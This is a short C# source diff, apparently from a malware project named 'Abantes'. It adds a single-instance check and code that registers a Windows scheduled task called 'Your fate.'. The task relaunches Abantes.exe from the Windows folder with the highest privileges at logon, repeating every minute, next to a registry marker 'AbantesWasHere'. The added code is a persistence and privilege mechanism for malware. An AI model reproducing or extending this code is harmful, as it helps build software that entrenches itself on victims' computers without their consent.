@@ -20,6 +20,8 @@ namespace Abantes
         [STAThread]
         static void Main(string[] args)
         {
+            if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
+
             RegistryKey editKey;
             string TempPath = Path.GetTempPath();
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
@@ -31,6 +33,14 @@ namespace Abantes
                 editKey.Close();
             }
 
+            TaskService ts = new TaskService();
+            TaskDefinition td = ts.NewTask();
+            td.Principal.RunLevel = TaskRunLevel.Highest;
+            LogonTrigger interval = new LogonTrigger();
+            interval.Repetition.Interval = TimeSpan.FromMinutes(1);
+            td.Triggers.Add(interval);
+            td.Actions.Add(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "Abantes.exe", null));
+            ts.RootFolder.RegisterTaskDefinition("Your fate.", td);
 
         }
     }
